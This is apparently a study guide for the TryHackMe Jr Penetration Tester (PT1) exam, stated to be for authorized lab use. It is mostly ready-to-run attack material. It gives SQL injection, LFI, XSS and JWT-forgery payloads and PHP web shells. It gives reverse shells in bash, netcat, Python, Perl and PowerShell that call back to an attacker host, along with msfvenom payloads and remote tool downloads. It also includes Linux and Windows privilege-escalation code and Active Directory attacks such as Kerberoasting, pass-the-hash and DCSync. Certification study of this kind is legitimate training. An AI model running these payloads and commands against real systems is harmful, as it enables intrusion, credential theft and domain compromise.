
# PT1 Exam - Guided By RedBlock

Updated 2026-07-29· 17 min read· 222 views

**Jr Penetration Tester (PT1) - TryHackMe**

![PT1 Exam - Guided By RedBlock](https://offsecexams.com/api/uploads/large/1785310386086-THM-PT1ByRedBlock.webp)

## PT1 Field Guide (Complete Edition) — TryHackMe Jr Penetration Tester

A professional, command-driven reference for the **TryHackMe Jr Penetration Tester (PT1)** exam, organized around the six graded domains — **Recon & Enumeration, Web App Testing, Network Pentest, Active Directory, Exploitation & Post-Exploitation, Reporting & Time Management**. Field-tested tool notes and snippets folded in.

> **Exam reality:** PT1 is a hands-on practical — enumerate, exploit, escalate, and **document**. You're graded on methodology and a clear report. Enumerate thoroughly, screenshot every step, and manage your time across the domains. ⚠️ **Authorized/lab use only.** All commands target the THM lab / boxes you're authorized to test. Use placeholder targets (`TARGET`, `<target-ip>`) with your own addressing.

---

## Table of Contents

1. Exam Overview & Workflow
    
2. Recon & Enumeration — Passive & Active
    
3. Nmap Reference
    
4. Network Scanning (ARP, masscan, tcpdump)
    
5. Service Enumeration — SMB, NFS
    
6. Service Enumeration — FTP, SSH, SMTP, SNMP, RDP, Telnet
    
7. Web Application Testing — Discovery
    
8. Web — SQL Injection & Databases
    
9. Web — LFI, RFI & Path Traversal
    
10. Web — Command Injection, XSS, JWT, Null Byte, File Upload
    
11. Network Pentest — Password Attacks & Exploit Search
    
12. Active Directory Exploitation
    
13. Exploitation — Metasploit, msfvenom, Reverse Shells
    
14. Post-Exploitation & Shell Stabilization
    
15. Linux Privilege Escalation
    
16. Windows Privilege Escalation
    
17. Supporting Tools (find, GPG, stego, forensics, OpenSSL, wordlists)
    
18. Worked Box Walkthroughs
    
19. Reporting & Time Management
    
20. Quick Reference & Glossary
    

---

## 1. Exam Overview & Workflow

**The six graded domains:** (1) Recon & Enumeration, (2) Web App Testing, (3) Network Pentest, (4) AD Exploitation, (5) Exploitation & Post-Exploitation, (6) Reporting & Time Management.

**Engagement loop (per host):** scan → enumerate every service → find the vuln → exploit → **get a shell** → stabilize → **loot creds** → **privesc** → post-ex → document.

**Notes template (per host):**

```
HOST <target-ip>
Ports    : 22 ssh, 80 http (WordPress), 445 SMB
Findings : anonymous SMB share; SQLi in /login
Access   : www-data via web shell -> user via creds -> root via sudo GTFOBins
Creds    : bob:Summer2024! ; hashes in /etc/shadow
Evidence : screenshots/<target-ip>-*.png
```

**Golden rule:** you can't re-pop a box after the clock stops — capture evidence as you go.

---

## 2. Recon & Enumeration — Passive & Active

**Passive:** DNSdumpster, `whois TARGET`, crt.sh subdomains, Google dorks, public metadata. **Active first moves on any box:**

```bash
sudo nmap -sS -p- --min-rate 2000 <target-ip> -oN allports.txt     # full TCP
sudo nmap -sC -sV -p <open-ports> <target-ip> -oN services.txt     # scripts + versions
sudo nmap -sU --top-ports 50 <target-ip>                            # UDP (SNMP/DNS/TFTP/NFS)
```

Enumerate **every** open service by version → map to exploits. On a foothold, always check other NICs (`ip a`, `arp -a`) for internal segments.

---

## 3. Nmap Reference

```bash
# scan types
sudo nmap -sS TARGET            # SYN (default, fast)
sudo nmap -sT TARGET            # full connect (use over proxies)
sudo nmap -sU TARGET            # UDP
sudo nmap -sN/-sF/-sX TARGET    # NULL / FIN / Xmas
sudo nmap -Pn TARGET            # skip host discovery
# detection & output
sudo nmap -sV TARGET            # service versions
sudo nmap -O TARGET             # OS detection
sudo nmap -sV -oN file.txt TARGET
sudo nmap -sT -p- -T4 TARGET    # all ports
# host discovery / ping sweeps
sudo nmap -sn 192.168.1.0/24            # ping sweep
sudo nmap -sn -PR 192.168.1.0/24        # ARP
sudo nmap -sn -PE 192.168.1.0/24        # ICMP echo
sudo nmap -sn -PS22,80,443 192.168.1.0/24   # SYN sweep
sudo nmap -sn -PA22,80,443 192.168.1.0/24   # ACK sweep
sudo nmap -sn -PU 192.168.1.0/24        # UDP sweep
# scripts (NSE)
grep "ftp" /usr/share/nmap/scripts/script.db
sudo nmap --script=vuln TARGET
sudo nmap -sC TARGET                     # default scripts
sudo nmap -p445 --script=smb-vuln* TARGET
sudo nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET
sudo nmap -p111 --script=nfs-ls,nfs-statfs,nfs-showmount TARGET
```

---

## 4. Network Scanning (ARP, masscan, tcpdump)

```bash
# ARP scan (local segment)
sudo arp-scan -l
sudo arp-scan 192.168.2.0/24
# masscan (fast wide sweep)
sudo masscan <target-ip>/24 -p80,443
# capture traffic (e.g. ICMP over the VPN interface)
sudo tcpdump ip proto \\icmp -i tun0
```

---

## 5. Service Enumeration — SMB, NFS

**SMB / Samba:**

```bash
enum4linux -a TARGET               # or ./enum4linux.pl -a ; enum4linux-ng -A TARGET
enum4linux -U TARGET               # users
enum4linux -S TARGET               # shares
smbclient //TARGET/share -U anonymous -p 445      # anonymous access
smbget -R //TARGET/share           # recursive download
sudo nmap -p445 --script=smb-vuln* TARGET         # MS17-010 etc.
sudo nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET
```

**NFS:**

```bash
sudo apt install nfs-common
showmount -e TARGET                # exported shares
sudo mount -o rw,vers=3 TARGET:/SHARE /mnt/nfs     # mount
stat /mnt/nfs/somefile             # check owner/perms (uid maps matter for privesc)
```

**NFS privesc note:** if a share is exported with `no_root_squash` and you're root locally, you can plant an SUID root binary on the share that executes on the target.

---

## 6. Service Enumeration — FTP, SSH, SMTP, SNMP, RDP, Telnet

Enumerate **every** open service by version — the foothold is usually a banner, weak creds, or an anonymous login.

```bash
# FTP (21) — try anonymous first
ftp TARGET            # anonymous:anonymous  ; then: ls, get, put
nmap --script ftp-anon,ftp-vsftpd-backdoor -p21 TARGET
# SSH (22)
nc TARGET 22          # grab the banner (version -> searchsploit)
ssh user@TARGET       # test creds / key auth
# SMTP (25) — user enumeration
nmap --script smtp-enum-users,smtp-commands -p25 TARGET
smtp-user-enum -M VRFY -U users.txt -t TARGET
# Telnet (23) — often default/weak creds
telnet TARGET 23
# SNMP (161/udp) — community strings leak users/processes/routes
snmpwalk -v2c -c public TARGET
onesixtyone -c community.txt TARGET ; snmp-check TARGET -c public
# RDP (3389) / WinRM (5985)
nmap --script rdp-ntlm-info -p3389 TARGET
crackmapexec winrm TARGET -u user -p pass
xfreerdp /v:TARGET /u:user /p:pass
# POP3/IMAP (110/143), MySQL (3306), MSSQL (1433), Redis (6379), RPC (135), LDAP (389)
nc TARGET 110 ; redis-cli -h TARGET ; rpcclient -U '' -N TARGET
```

**Rule:** grab the version banner of everything, `searchsploit <service version>`, and always test anonymous/default logins (FTP, SMB, Telnet, Redis, SNMP `public`).

---

## 7. Web Application Testing — Discovery

```bash
whatweb http://TARGET; nikto -h http://TARGET
gobuster dir -u http://TARGET -w directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
gobuster dir -u http://TARGET -w directory-list-2.3-medium.txt   # start plain, then add -x
curl -s http://TARGET/robots.txt
```

Map every page/parameter; note tech stack, login forms, upload features, and hidden dirs (`/admin`, `/api`, backups). Discovery drives the web attacks in §7–8.

---

## 8. Web — SQL Injection & Databases

**Detect:** add `'` / `"` / `)` → error or behavior change. Confirm with boolean and time logic.

```sql
-- auth bypass (login form)
admin'-- -        ' OR '1'='1'-- -        ' OR 1=1 LIMIT 1-- -
-- boolean-blind (page differs true vs false)
' AND '1'='1      (true)          ' AND '1'='2      (false)
-- time-blind (no visible output)
' AND SLEEP(5)-- -                (MySQL)   '; WAITFOR DELAY '0:0:5'-- -   (MSSQL)
-- UNION: find column count, then a string column, then dump
' ORDER BY 4-- -                              (increment until error)
' UNION SELECT 1,2,3,4-- -                    (which number reflects)
' UNION SELECT 1,version(),database(),4-- -
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
```

**Automate / escalate:**

```bash
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -u "http://TARGET/page?id=1" -D appdb -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3      # from a saved Burp request
sqlmap -u "http://TARGET/page?id=1" --os-shell         # stacked/FILE priv -> RCE
```

Dumped creds → crack (john/hashcat) → log in; `INTO OUTFILE` (MySQL FILE priv) → web shell.

**MySQL client & recon:**

```bash
sudo apt install default-mysql-client
mysql -h TARGET -u root -p
mysql> select version(); show databases; use <db>; show tables; select * from users;
```

**MySQL UDF privesc (raptor_udf2 — when you have DB root & write to plugin dir):**

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
# inside mysql:
use mysql;
create table foo(line blob);
insert into foo values(load_file('/path/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
# then:  /tmp/rootbash -p     -> root
```

**SQLite:**

```bash
sqlite3 database.db
sqlite> .tables
sqlite> PRAGMA table_info(my_table);
sqlite> SELECT * FROM my_table;
```

---

## 9. Web — LFI, RFI & Path Traversal

**Path traversal / Local File Inclusion (a file/page param builds a filesystem path):**

```
?file=../../../../etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd            # URL-encoded
?file=....//....//etc/passwd                 # filter bypass
?file=/etc/passwd%00                          # null byte (old PHP)
?file=php://filter/convert.base64-encode/resource=index.php   # read source code
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==   # data:// RCE
```

**LFI → RCE (log poisoning):** inject PHP into a log the app can include (e.g. `User-Agent: <?php system($_GET['c']); ?>` then `?file=/var/log/apache2/access.log&c=id`), or `/proc/self/environ`. **Remote File Inclusion (if** `allow_url_include`**):** `?file=http://YOUR-IP/shell.txt`. **Read interesting files:** `/etc/passwd`, `/etc/shadow` (if readable), app config (`config.php`, `wp-config.php`), SSH keys (`/home/user/.ssh/id_rsa`), and `/var/www/` source for creds.

---

## 10. Web — Command Injection, XSS, JWT, Null Byte, File Upload

**Command injection** (input reaches the OS):

```bash
$(id)   $(pwd)   $(cat /etc/passwd)      # substitution
; id    | id    & id    `id`             # separators
; bash -c 'bash -i >& /dev/tcp/YOUR-IP/443 0>&1'   # -> reverse shell
```

**XSS:**

```html
<iframe src="javascript:alert(`xss`)">
<script>alert(document.cookie)</script>
"><img src=x onerror=alert(1)>
```

**Header-based XSS** (payload in a header the app reflects):

```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

**JWT** `none`**-algorithm bypass:**

```bash
echo -n "<header-b64>" | base64 -d ; echo -n "<payload-b64>" | base64 -d   # decode
echo -n '{"typ":"JWT","alg":"none"}' | base64          # forge header
echo -n '{"username":"admin","exp":1710420383}' | base64  # forge payload
# join header.payload.  (trailing dot, empty signature):
<header-b64>.<payload-b64>.
```

**Poison null byte** (bypass extension checks on old stacks):

```
http://TARGET/path/file.ext%2500.pdf
```

**Unauthenticated file-upload → RCE (pattern):** many teaching apps (e.g. projectworlds _Online Book Store 1.0_, Tib3rius's public exploit-db PoC) accept an image upload at an admin endpoint (`admin_add.php`) with no auth and no real type check → upload `shell.php` (`<?php echo shell_exec($_GET['cmd']); ?>`) → it lands in a served dir (`/bootstrap/img/`) → `?cmd=whoami`. The general method: **find an upload, bypass the type/extension check (Content-Type/double-ext/magic bytes), locate where it's served, trigger it.**

---

## 11. Network Pentest — Password Attacks & Exploit Search

**Hydra (online brute):**

```bash
hydra -t 10 -l USER -P wordlist.txt -vV TARGET ftp
hydra -t 10 -l USER -P wordlist.txt -vV TARGET ssh
hydra -t 10 -l USER -P wordlist.txt -vV TARGET http-post-form \
 "/login:username=^USER^&password=^PASS^:F=Invalid"        # F=fail string (S=success, H=header)
```

**John the Ripper (offline cracking):**

```bash
john --list=formats
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
unshadow passwd shadow > passwords.txt ; john --wordlist=rockyou.txt passwords.txt
ssh2john.py id_rsa > rsa.txt ; john rsa.txt
john --format=NT --wordlist=rockyou.txt hash.txt          # Windows NTLM
```

**Find exploits:**

```bash
searchsploit fuel cms ; searchsploit proftpd 1.3.5
searchsploit -m <id>          # copy a PoC locally
# refs: exploit-db.com, nvd.nist.gov, cve.mitre.org
```

**Wordlists:** `rockyou.txt`, SecLists (`best1050.txt`, `top-usernames-shortlist.txt`, `directory-list-2.3-medium.txt`).

---

## 12. Active Directory Exploitation

**Enumerate (from Linux, with creds):**

```bash
crackmapexec smb <dc-ip>/24 -u user -p pass
crackmapexec smb <dc-ip> -u user -p pass --users --groups --shares --pass-pol
ldapdomaindump -u 'DOM\user' -p pass <dc-ip>
bloodhound-python -u user -p pass -d dom.local -c all -ns <dc-ip>
```

**From Windows (admin actions on AD — from the notes):**

```powershell
# reset a user's password
Set-ADAccountPassword USER -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
# force password change at next logon
Set-ADUser -ChangePasswordAtLogon $true -Identity USER -Verbose
gpupdate /force        # apply group policy now
# recon: . .\PowerView.ps1 ; Get-NetUser ; Get-NetGroup "Domain Admins" ; Find-LocalAdminAccess
```

**Attacks:**

```bash
GetUserSPNs.py dom.local/user:pass -dc-ip <dc-ip> -request   # Kerberoast -> hashcat -m 13100
GetNPUsers.py dom.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>   # AS-REP -> hashcat -m 18200
crackmapexec smb <ip> -u administrator -H <NTLM>            # Pass-the-Hash
psexec.py -hashes :<NTLM> administrator@<ip>                # lateral / SYSTEM
secretsdump.py dom.local/administrator@<dc-ip> -just-dc     # DCSync (DA/on DC)
```

**Flow:** enumerate (BloodHound) → roast/PtH → reach a Domain Admin or the DC → DCSync → domain owned. (Deeper AD/pivoting is in the CPENT-style material.)

---

## 13. Exploitation — Metasploit, msfvenom, Reverse Shells

**msfvenom payloads:**

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=YOUR-IP lport=PORT R
msfvenom -p linux/x64/shell_reverse_tcp lhost=YOUR-IP lport=PORT -f elf -o shell.elf
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=YOUR-IP lport=PORT -f exe -o s.exe
msfvenom -p php/reverse_php lhost=YOUR-IP lport=PORT -f raw -o shell.php
```

**Metasploit (from the notes):**

```bash
msfconsole -q
use auxiliary/scanner/smtp/smtp_version ; set RHOSTS TARGET ; run     # SMTP version
use auxiliary/scanner/smtp/smtp_enum ; set USER_FILE users.txt ; run  # SMTP user enum
use auxiliary/scanner/mysql/mysql_hashdump ; set USERNAME root ; set PASSWORD pw ; run
use exploit/windows/smb/ms17_010_eternalblue ; setg RHOSTS TARGET ; setg LHOST YOUR-IP ; exploit
use exploit/multi/handler ; set payload <same-as-msfvenom> ; set LHOST YOUR-IP ; run   # catch
```

**Meterpreter basics:** `shell`, `ps`, `migrate <pid>`, `hashdump`, `search -f *flag*`, `cat <file>`. **Upgrade a shell to meterpreter:** background (`Ctrl+Z`) → `sessions -u 1` (or `use multi/manage/shell_to_meterpreter`). **Reverse shells (catch with** `nc -lvnp 443`**):**

```bash
bash -i >& /dev/tcp/YOUR-IP/443 0>&1                 # bash /dev/tcp (most common)
nc TARGET PORT -e /bin/bash                          # netcat -e (if available)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP 443 >/tmp/f   # netcat no -e
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;$i="YOUR-IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# PowerShell (Windows):
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('YOUR-IP',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($sb),0,$sb.Length)}"
# PHP: pentestmonkey/php-reverse-shell ; use https://revshells.com to generate any variant
```

**File transfer (get tools onto the target):**

```bash
python3 -m http.server 80                  # serve from attacker
wget http://YOUR-IP/linpeas.sh -O /tmp/l.sh ; curl -O http://YOUR-IP/f    # Linux pull
certutil -urlcache -f http://YOUR-IP/nc.exe nc.exe                        # Windows
powershell iwr http://YOUR-IP/s.exe -OutFile s.exe                       # Windows
scp file user@TARGET:/tmp/    # over SSH ;  or  nc -lvnp 4444 > out  /  nc YOUR-IP 4444 < file
```

---

## 14. Post-Exploitation & Shell Stabilization

**Stabilize a dumb shell → full PTY:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Automated enumeration (run first on any shell):** PEASS-ng (**linpeas/winpeas**), LinEnum, linux-exploit-suggester (LES), linux-smart-enumeration (lse), linuxprivchecker. **File transfer:** `python3 -m http.server 80` on attacker → `wget`/`curl`/`certutil` on target.

---

## 15. Linux Privilege Escalation

**Enumerate:**

```bash
id; sudo -l; uname -a
find / -type f -perm -04000 -ls 2>/dev/null          # SUID
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null                              # capabilities
find / -writable -ls 2>/dev/null | grep -v '/sys\|/proc\|/run\|/snap'
find / -name '*.txt' 2>/dev/null ; locate password
./linpeas.sh -a
```

**Vectors (from the notes):**

- **sudo (GTFOBins):** `sudo -l` → abuse an allowed binary (see gtfobins.github.io).
    
- **Writable** `/etc/passwd`**:** add a UID-0 user — `openssl passwd -1 -salt xx mypass` → append `hacker:<hash>:0:0::/root:/bin/bash`.
    
- **Writable** `/etc/shadow`**:** `mkpasswd -m sha-512 pass` → replace root's hash.
    
- `tar` **wildcard injection** (script runs `tar czf x.tar.gz *`):
    
    ```bash
    touch /home/user/--checkpoint=1touch /home/user/--checkpoint-action=exec=shell.elf
    ```
    
- **SUID GTFOBins:** e.g. `/usr/bin/find . -exec /bin/sh -p \;`.
    
- **Bash function hijack (bash <4.2-048):**
    
    ```bash
    function /usr/sbin/service { /bin/bash -p; }; export -f /usr/sbin/service; ./vuln_app
    ```
    
- **PS4 debug abuse (bash <4.4):**
    
    ```bash
    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/super; chmod +xs /tmp/super)' /some/app ; /tmp/super -p
    ```
    
- **Shared-library hijacks (C snippets — compile static to avoid GLIBC mismatch:** `gcc x.c -o x -w -static`**):**
    
    ```c
    // LD_PRELOAD:  gcc -fPIC -shared -nostartfiles -o preload.so preload.c// run: sudo LD_PRELOAD=./preload.so <app>void _init(){ unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
    ```
    
    ```c
    // LD_LIBRARY_PATH / SO injection / PATH hijack (constructor-based):static void x() __attribute__((constructor));void x(){ setuid(0); system("/bin/bash -p"); }
    ```
    
    (Use `ldd`/`strace`/`strings` on the target binary to find which library or PATH lookup to hijack.)
    
- **Kernel exploit:** match `uname -r` via LES (last resort).
    

---

## 16. Windows Privilege Escalation

```cmd
whoami /priv & whoami /groups & systeminfo
.\winPEASx64.exe  &  powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
```

**Common vectors (with the how):**

- **SeImpersonatePrivilege** (service accounts, `whoami /priv`) → PrintSpoofer/Potato family → SYSTEM:
    
    ```cmd
    PrintSpoofer.exe -i -c cmd      ::  or GodPotato / JuicyPotato depending on OS
    ```
    
- **Unquoted service path** with a writable directory → drop a malicious binary in the gap.
    
- **Weak service permissions** → reconfigure `binPath` to your payload:
    
    ```cmd
    sc qc <service> & accesschk.exe -uwcqv "Everyone" <service>sc config <service> binPath= "C:\rev.exe" & sc start <service>
    ```
    
- **AlwaysInstallElevated** (both HKLM+HKCU set) → install a malicious MSI as SYSTEM:
    
    ```cmd
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedmsfvenom -p windows/x64/exec CMD="net user hacker Pass123! /add" -f msi -o e.msi & msiexec /qn /i e.msi
    ```
    
- **Stored credentials:** `cmdkey /list`, `runas /savecred`, `unattend.xml`, registry AutoLogon, saved RDP/WinRM creds.
    
- **Token/kernel:** cross `systeminfo` against Windows-Exploit-Suggester for a missing patch. SYSTEM → `hashdump` / mimikatz `sekurlsa::logonpasswords` → feed lateral movement (§12).
    

---

## 17. Supporting Tools (find, GPG, stego, forensics, OpenSSL, wordlists)

**Find on Linux:**

```bash
find / -name passwords.txt ; find / -iname '*.txt' ; locate passwords.txt
find / -type f -perm -04000 -ls 2>/dev/null    # SUID
getcap -r / 2>/dev/null                          # capabilities
```

**GPG/PGP (decrypt loot):**

```bash
gpg --import private.key ; gpg --list-secret-keys
gpg --decrypt --output out.txt encrypted.gpg
```

**Steganography:**

```bash
steghide info pic.jpg ; steghide extract -sf pic.jpg      # extract hidden data
```

**Forensics / metadata:**

```bash
pdfinfo document.pdf                              # poppler-utils
exiftool image.jpg                               # libimage-exiftool-perl
```

**OpenSSL (hashes for privesc):** `openssl passwd -1 -salt SAL mypass`. **VPN:** `sudo openvpn your-file.ovpn`. **Wordlists:** rockyou.txt; SecLists (passwords/usernames/directories). PHP ext list: `printf "php\nphp3\nphp5\nphtml\n" > phpext.txt`.

---

## 18. Worked Box Walkthroughs

_Two short end-to-end chains that mirror the PT1 flow. Authorized/lab only, placeholder targets._

**Walkthrough A — Web upload → shell → sudo GTFOBins → root.**

1. **Recon:** `nmap -sC -sV -p- <ip>` → 22, 80. `gobuster` → `/admin`, an upload form.
    
2. **Foothold:** the upload validates `Content-Type` only → upload `shell.php` (`<?php system($_GET['c']);?>`) as `image/jpeg` → browse it → `?c=id` = `www-data`.
    
3. **Shell + stabilize:** `?c=bash -c 'bash -i >%26 /dev/tcp/YOUR-IP/443 0>%261'` (catcher `nc -lvnp 443`) → `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `stty raw -echo; fg`.
    
4. **Loot + user:** `linpeas` finds creds in `config.php` → `su bob` (password reuse).
    
5. **Privesc:** `sudo -l` → `(root) NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/sh \; -quit` → **root**. Document each step.
    

**Walkthrough B — SMB anon → creds → SSH → SUID root.**

1. **Recon:** `nmap` → 22, 139/445. `enum4linux -a <ip>` → an **anonymous share**.
    
2. **Loot the share:** `smbclient //<ip>/share -U anonymous` → download a backup with a password / SSH key.
    
3. **Foothold:** `ssh user@<ip>` (or `ssh -i id_rsa user@<ip>`).
    
4. **Privesc:** `find / -perm -4000 2>/dev/null` → an unusual **SUID** binary in GTFOBins → run its SUID payload (e.g. `/usr/bin/env /bin/sh -p`) → **root**.
    
5. **Post-ex:** `cat /root/root.txt`, dump `/etc/shadow`, screenshot, and note the fix (remove anon share, drop the SUID bit).
    

**Walkthrough C — AD: foothold → Kerberoast → Domain Admin.**

1. **Recon:** `nmap -sC -sV` on the DC → 88 (Kerberos), 389 (LDAP), 445 (SMB), 3268 (GC). A member box gives a low-priv domain cred (from a web app / SMB share / password spray with `crackmapexec`).
    
2. **Enumerate the domain:** `bloodhound-python -u user -p pass -d dom.local -c all -ns <dc-ip>` → import into BloodHound → find a path from your user to Domain Admins.
    
3. **Kerberoast:** `GetUserSPNs.py dom.local/user:pass -dc-ip <dc-ip> -request` → crack the service ticket: `hashcat -m 13100 tgs.hash rockyou.txt` → `sqlsvc:Password1!`.
    
4. **Escalate:** BloodHound shows `sqlsvc` has (or reaches) DCSync/DA rights → `secretsdump.py dom.local/sqlsvc:'Password1!'@<dc-ip> -just-dc` → dump `administrator` + `krbtgt` NTLM.
    
5. **Own the DC:** `psexec.py -hashes :<admin-NTLM> administrator@<dc-ip>` → SYSTEM on the DC → grab the flag, document the path.
    

**Takeaway:** all three chains are _enumerate → find the one weak thing → foothold → stabilize/loot → escalate → document_. That loop is the whole exam.

---

## 19. Reporting & Time Management

**Report structure:**

```
1. Executive Summary   - business risk & posture (non-technical)
2. Scope & Methodology - targets, timeframe, approach
3. Findings            - per finding: Title, Severity (CVSS), Host, Description,
                         Impact, Evidence (screenshot), Steps to Reproduce, Remediation
4. Attack Narrative    - the chained path: recon -> foothold -> privesc -> post-ex
5. Remediation Summary - prioritized fixes
6. Appendices          - command output, tool versions
```

**Time management:** timebox each box/domain; enumerate thoroughly before exploiting (most stalls are missed enumeration); screenshot every success **as it happens**; keep a running notes file per host; if stuck, move on and return. Every finding needs **repro + evidence + a fix**.

---

## 20. Quick Reference & Glossary

**First-15-minutes on a box:**

```bash
sudo nmap -sC -sV -p- --min-rate 2000 <target-ip> -oN scan.txt
# per service: enum4linux (SMB), showmount -e (NFS), gobuster+nikto (HTTP), mysql/sqlite (DB)
# get a shell -> stabilize (pty) -> linpeas -> privesc -> loot -> document
```

**Glossary:**

- **Enumeration** — exhaustively mapping services/versions/params before exploiting (where most points are won/lost).
    
- **Reverse vs bind shell** — target connects back to you / you connect to a listener on the target.
    
- **SUID / capabilities / sudo / GTFOBins** — Linux privesc primitives.
    
- **LD_PRELOAD / LD_LIBRARY_PATH / SO injection / PATH hijack** — library-based privesc when a root process loads an attacker-controllable library.
    
- **Kerberoast / AS-REP / PtH / DCSync** — core AD attacks.
    
- **JWT** `none` — unsigned-token forgery when the server trusts `alg:none`.
    
- **Attack narrative** — the chained engagement story in the report.
    

---

_End of guide. All commands are for the authorized THM lab / boxes you're permitted to test. PT1 is won on thorough enumeration, turning findings into shells, privilege escalation, and a clear report — document every step with evidence as you go._